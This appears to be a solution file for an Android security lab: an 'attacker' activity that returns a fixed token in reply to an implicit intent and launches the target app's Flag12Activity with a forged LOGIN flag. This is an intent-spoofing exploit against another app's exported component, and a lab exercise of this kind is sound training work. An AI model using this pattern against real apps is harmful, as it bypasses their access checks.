package io.hextree.attackerapp;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

public class ImplicitIntentReceiver extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_implicit_intent_receiver);


        Intent intent = getIntent();
        Intent returnintent = new Intent();
        intent.putExtra("token", 1094795585);
        setResult(-1, intent);

        finish();

        Intent embeddedIntent = new Intent();
        embeddedIntent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag12Activity"));
        embeddedIntent.putExtra("LOGIN", true);
        //embeddedIntent.putExtra("android.intent.extra.INTENT", intent);
        startActivity(embeddedIntent);

        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.buttobb), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });
    }
}